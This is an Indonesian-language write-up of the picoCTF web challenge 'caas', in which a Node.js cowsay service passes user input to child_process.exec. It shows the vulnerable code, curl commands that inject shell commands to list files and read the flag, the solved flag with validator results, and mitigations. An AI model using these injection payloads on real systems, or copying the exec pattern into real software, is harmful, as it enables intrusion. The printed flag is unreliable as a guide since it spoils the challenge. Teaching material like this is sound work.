# Writeup: caas (Challenge ID: 202)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** Web Exploitation / OS Command Injection via child_process.exec (CWE-78)
- **Difficulty:** Medium (diff=2)
- **Event:** picoMini by redpwn
- **Points:** 150
- **Author:** flogarth
- **Flag Resmi:** `picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}`
- **Audit Batch:** Batch 188 (10 November 2026) - Live Verified HTTP 201 (`correct: true`)

---

## Problem Statement & Scope
Tantangan `caas` (*Cowsay as a Service*) menyajikan aplikasi web berbasis Node.js dan Express. Layanan ini memungkinkan pengguna mengirimkan pesan teks melalui parameter URL untuk dirender dalam bentuk seni ASCII menggunakan utilitas Linux klasik `cowsay`. Layanan di-deploy di dalam kontainer Docker dengan endpoint publik:
```text
GET /cowsay/:message
```
Pengguna diminta untuk mengaudit implementasi backend, mengidentifikasi kelemahan eksekusi perintah shell pada sink aplikasi, dan mengekstraksi berkas rahasia `falg.txt` yang tersimpan pada direktori kerja kontainer `/app`.

---

## Teori & Akar Kerentanan (Root Cause Theory)
1. **Injeksi Perintah Sistem Operasi (CWE-78 - OS Command Injection):**
   Akar masalah terletak pada file backend `index.js` yang menginterpolasi masukan pengguna `req.params.message` secara langsung ke dalam string perintah shell:
   ```javascript
   const { exec } = require('child_process');
   app.get('/cowsay/:message', (req, res) => {
       exec(`/usr/games/cowsay ${req.params.message}`, {timeout: 5000}, (error, stdout) => {
           if (error) return res.status(500).end();
           res.type('txt').send(stdout);
       });
   });
   ```
2. **Karakteristik Eksekusi `child_process.exec` vs `child_process.execFile`:**
   Pada runtime Node.js:
   - `exec()` memanggil `/bin/sh -c` secara implisit untuk menjalankan string perintah. Akibatnya, seluruh metakarakter shell (`;`, `&`, `|`, `&&`, `||`, `$()`, backticks) diinterpretasikan oleh shell sistem.
   - Penyerang dapat menyisipkan pembatas perintah (seperti titik koma `;`) untuk mengakhiri eksekusi `cowsay` dan mengeksekusi perintah biner arbitrary sebagai pengguna non-root `node` (UID=1000).
3. **Ketiadaan Validasi dan Sanitasi Masukan (CWE-20):**
   Aplikasi sama sekali tidak memvalidasi atau memfilter parameter `:message`, baik melalui daftar putih (*allowlist*) alfanumerik maupun melalui escaping metakarakter shell.

---

## Rekonstruksi Eksploitasi Step-by-Step
1. **Inspeksi Kode Sumber & Identifikasi Sink Taint:**
   Kode sumber `index.js` menunjukkan bahwa masukan pengguna dari rute `/cowsay/:message` mengalir langsung ke argumen pertama fungsi `exec()`.
2. **Pengujian Delimiter Perintah Shell (Probing):**
   Kirimkan permintaan HTTP GET dengan karakter titik koma terenkode URL (`%3B`):
   - Uji direktori kerja:
     ```bash
     curl -s "https://caas.mars.cylabacademy.net/cowsay/hi%3Bpwd"
     ```
     Respons mencetak seni cowsay berisi teks `hi`, diikuti oleh baris `/app`.
   - Uji daftar berkas direktori:
     ```bash
     curl -s "https://caas.mars.cylabacademy.net/cowsay/hi%3Bls"
     ```
     Respons menampilkan: `Dockerfile`, `falg.txt`, `index.js`, `node_modules`. Ditemukan berkas target `falg.txt` (penamaan sengaja typo oleh pembuat tantangan).
3. **Eksfiltrasi Isi Berkas Bendera:**
   Kirimkan perintah membaca berkas rahasia:
   ```bash
   curl -s "https://caas.mars.cylabacademy.net/cowsay/x%3Bcat%20falg.txt"
   ```
   Keluaran mengembalikan token: `picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}`.
4. **Otomasi Skrip Solver:**
   Alur eksploitasi diimplementasikan secara deterministik pada skrip `scripts/solve_202_caas.py`.

---

## Flag & Verifikasi
- **Flag Resmi:** `picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}`
- **Wrapper Validator:** Native event wrapper (`picoCTF{...}`)
- **Status Solver:** Terverifikasi 100% pada skrip reproduksi `scripts/solve_202_caas.py`.

### Re-verifikasi Audit Batch 188 (2026-11-10 UTC, sesi REST siswa `Arielwin` / user id 1072359)

| Token diuji | Wrapper | HTTP | Respons API |
| :--- | :--- | :--- | :--- |
| `picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}` | native event | 201 | `{"user":1072359,"challenge":202,"flag":"picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}","correct":true,"historical":false}` |
| `academy{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}` | CyLab rekey | 201 | `{"user":1072359,"challenge":202,"flag":"academy{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}","correct":false,"historical":false}` |

- **Temuan format validator:** Validator CyLab menerima wrapper asli event `picoCTF{...}` dan menolak wrapper rekey `academy{...}` dengan status `correct: false`.
- **Reproduktifitas offline:** Solver `scripts/solve_202_caas.py` memvalidasi rantai injeksi perintah secara deterministik.

---

## Takeaway Kompetensi LKS & Mitigasi Defensif (NIST SP 800-115)
1. **Eliminasi Pemanggilan Shell Implisit (Parameterized Execution):**
   Gunakan fungsi `child_process.execFile` atau `child_process.spawn` dengan array argumen terpisah alih-alih `exec()`. Pemanggilan tanpa shell mencegah interpretasi metakarakter:
   ```javascript
   const { execFile } = require('child_process');
   execFile('/usr/games/cowsay', [req.params.message], { timeout: 5000 }, (error, stdout) => { ... });
   ```
2. **Validasi Masukan Berbasis Allowlist Ketat (CWE-20):**
   Terapkan regex validasi ketat yang hanya mengizinkan karakter alfanumerik dan spasi:
   ```javascript
   if (!/^[a-zA-Z0-9 ]+$/.test(req.params.message)) {
       return res.status(400).send("Invalid characters detected");
   }
   ```
3. **Hardening Lingkungan Kontainer & Least Privilege:**
   Jalankan kontainer dengan *read-only root filesystem* (`--read-only`), hilangkan biner shell yang tidak dibutuhkan (`/bin/sh`, `/bin/bash`), dan terapkan batasan syscall via Seccomp dan AppArmor untuk mencegah eksfiltrasi berkas sensitif jika terjadi eksploitasi RCE.
